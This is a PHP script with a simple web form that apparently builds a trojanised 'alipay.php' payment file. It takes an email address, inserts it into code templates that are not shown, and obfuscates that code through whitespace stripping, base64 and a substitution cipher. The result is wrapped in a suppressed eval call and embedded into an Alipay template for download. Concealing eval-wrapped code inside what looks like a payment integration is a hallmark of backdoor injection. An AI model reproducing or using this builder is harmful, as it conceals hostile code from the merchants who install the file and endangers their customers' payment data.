<?php
define('D', DIRECTORY_SEPARATOR);
define('ROOT', dirname(__FILE__).D);
function phpcode_trim($code){
	$code=str_replace("\r\n","\n",$code);
	$len=strlen($code);
	$atstr=false;
	$ignore=false;
	$s_m='';//标记
	$phpcode='';
	for($i=0;$i<$len;$i++){
		if(!$atstr){
			$s=substr($code,$i,1);
			if($s=='\''||$s=='"') {
				$s_m=$s;
				$atstr=true;
				$phpcode.=$s;
				$ignore=false;
			} else {
				if(!$ignore||!in_array($s,array(' ',"\t","\r","\n"))) {
					if($s=='/' && $i+1!=$len) {
						switch(substr($code,$i+1,1)){
							case '/':
								if(($fa=strpos($code,"\n",$i+2))!==false) {
									$i=$fa;
								} else $i = $len - 1;//这里新增如果有错误请删除
							break;
							case '*':
								if(($fa=strpos($code,"*/",$i+2))!==false) {
									$i=$fa+1;
								}
							break;
							default :
								$phpcode.=$s;
								$ignore = true;
							break;
						}
					} else {
						$phpcode.=$s;
						$ignore=false;
						if(in_array($s,array(';','{','}',',','+','-','*','/','?',':','|','&','=','>','<','(',')')))$ignore=true;
					}
				} else {
					if(!$ignore)$phpcode.=$s;
				}
			}
		} else {
			$s=substr($code,$i,1);
			$phpcode.=$s;
			$s2=substr($code,$i+1,1);
			if($s=='\\'&& $i+1<$len && ($s2=='\\' || $s2==$s_m)) {
				$phpcode.=$s2;
				$i++;
			} elseif($s==$s_m) {
				$atstr=false;
			}
		}
	}
	$code=strrev($phpcode);
	$phpcode='';
	$len=strlen($code);
	$atstr=false;
	$ignore=false;
	$s_m='';//标记
	$phpcode='';
	for($i=0;$i<$len;$i++){
		if(!$atstr){
			$s=substr($code,$i,1);
			if($s=='\''||$s=='"') {
				$s_m=$s;
				$atstr=true;
				$phpcode.=$s;
				$ignore=false;
			} else {
				if(!$ignore||!in_array($s,array(' ',"\t","\r","\n"))) {
					$phpcode.=$s;
					$ignore=false;
					if(in_array($s,array(';','{','}',',','+','-','*','/','?',':','|','&','=','>','<','(',')')))$ignore=true;
				} else {
					if(!$ignore)$phpcode.=$s;
				}
			}
		} else {
			$s=substr($code,$i,1);
			$phpcode.=$s;
			if($s==$s_m && $i+1<$len && substr($code,$i+1,1)=='\\') {
				$phpcode.='\\';
				$i++;
			} elseif($s==$s_m) {
				$atstr=false;
			}
		}
	}
	$phpcode=trim(strrev($phpcode));
	return $phpcode;
}
function bf_stripslashes($arr){
	if(is_array($arr)){
		foreach($arr as $k => $v){
			$arr[$k] = bf_stripslashes($v);
		}
	} else return stripslashes($arr);
	return $arr;
}
function encodeCode($code){
	static $key1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
	static $key2 = '~!@#a%^&*()_+89|:"?bc-=[]\;\'/.,M1234567NBVCXZASDFGHJKLPOIUYTREWQ0';
	$code = phpcode_trim($code);
	$code = base64_encode($code);
	$code = strtr($code, $key1, $key2);
	$code = 'strtr(\''.addcslashes($code, '\'\\').'\', \''.addcslashes($key2, '\\\'').'\', \''.addcslashes($key1, '\\\'').'\')';
	$code = 'base64_decode('.$code.')';
	$code = '@eval('.$code.');';
	return $code;
}
function download($code){
	set_time_limit(0);
	$size = strlen($code);
	header("Content-type: application/octet-stream");   
	header("Accept-Ranges: bytes");   
	header("Accept-Length: ".$size);
	header("Content-Length: ".$size);
	header("Content-Disposition:attachment;filename=".iconv('utf-8', 'gbk', 'alipay.php'));
	echo $code;
	
}
if ($_POST) {
	get_magic_quotes_gpc() && $_POST = bf_stripslashes($_POST);
	if ($email = $_POST['email']) {
		$code1 = file_get_contents(ROOT.'code1.txt');
		$code2 = file_get_contents(ROOT.'code2.txt');
		$code  = file_get_contents(ROOT.'alipay.txt');
		$code1 = str_replace('{email}', $email, $code1);
		$code2 = str_replace('{email}', $email, $code2);
		$code1 = encodeCode($code1);
		$code2 = encodeCode($code2);
		$code  = str_replace('{code1}', $code1, $code);
		$code  = str_replace('{code2}', $code2, $code);
		//echo $code;exit;
		download($code);
		exit;
	}
}
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>无标题文档</title>
</head>

<body>
<form method="post" enctype="application/x-www-form-urlencoded">
	<textarea name="email" cols="60" rows="6"></textarea>
	<br />
	<input type="submit" value="提交" />
</form>
</body>
</html>